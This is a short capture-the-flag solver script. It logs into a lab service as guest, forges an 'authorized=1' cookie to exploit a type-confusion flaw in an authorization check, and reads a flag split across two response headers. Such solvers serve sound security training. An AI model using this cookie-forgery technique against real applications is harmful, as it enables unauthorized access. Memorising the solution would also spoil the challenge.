#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"
PORT="${PORT:-8297}"
FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"

python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import json, sys
from urllib.request import Request, urlopen

host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"

# Step 1: login as guest to observe cookie format
req = Request(base + "/api/login",
              data=json.dumps({"username": "guest", "password": "guest"}).encode(),
              headers={"Content-Type": "application/json"}, method="POST")
resp = urlopen(req, timeout=5)
# Cookie is: authorized=true (JSON boolean)
# json.loads("true") -> True, True is True -> blocked

# Step 2: forge cookie with int 1
# json.loads("1") -> int 1, 1 is True -> False (filter allows), bool(1) -> True (resolver grants)
req = Request(base + "/api/admin",
              headers={"Cookie": "authorized=1"})
resp = urlopen(req, timeout=5)
resp.read()

# Step 3: flag is split across two headers
part1 = resp.headers.get("X-Grant-Part1", "")
part2 = resp.headers.get("X-Grant-Part2", "")
print(part1 + part2)
PY
